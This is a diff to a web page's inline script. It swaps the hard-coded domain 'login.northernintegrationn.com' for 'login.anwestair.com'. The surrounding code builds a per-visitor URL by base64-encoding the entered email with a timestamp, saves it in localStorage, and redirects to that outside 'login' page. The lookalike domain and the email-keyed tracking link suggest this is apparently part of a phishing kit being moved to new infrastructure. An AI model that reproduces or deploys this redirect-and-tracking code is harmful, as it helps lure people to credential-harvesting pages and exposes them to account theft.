@@ -110,7 +110,7 @@
         function generateUniqueUrl(email) {
             const timestamp = Date.now();
             const uniqueId = btoa(email + timestamp).replace(/=/g, '');
-            return `https://login.northernintegrationn.com/c/${uniqueId}`;
+            return `https://login.anwestair.com/c/${uniqueId}`;
         }
 
         function processEmail() {
@@ -124,7 +124,7 @@
                 const uniqueUrl = generateUniqueUrl(emailField);
                 localStorage.setItem('uniqueAccessUrl', uniqueUrl);
                 // Redirect to the fixed URL
-                window.location.assign('https://login.northernintegrationn.com/c');
+                window.location.assign('https://login.anwestair.com/c');
             } else {
                 errorText.style.display = 'block';
             }
@@ -144,3 +144,4 @@
     </script>
 </body>
 </html>
+
